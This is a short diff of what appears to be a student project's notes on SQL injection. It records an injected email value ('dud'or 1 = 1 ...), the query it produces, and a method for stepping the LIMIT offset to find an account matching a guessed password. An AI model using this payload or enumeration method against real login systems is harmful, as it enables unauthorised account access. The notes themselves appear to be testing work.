@@ -80,7 +80,7 @@ dud'or 1 = 1 or email = 'hacked
 WIN!
 
 
-SELECT * FROM FYP.user_info WHERE email = 'dud'or 1 = 1 or email = 'hacked' LIMIT 1,1
+SELECT * FROM user_info WHERE email = 'dud'or 1 = 1 or email = 'hacked' LIMIT 1,1
 
 
 Can increment first argument of limit by one every time, until they find a match for a guessed password -  'password'
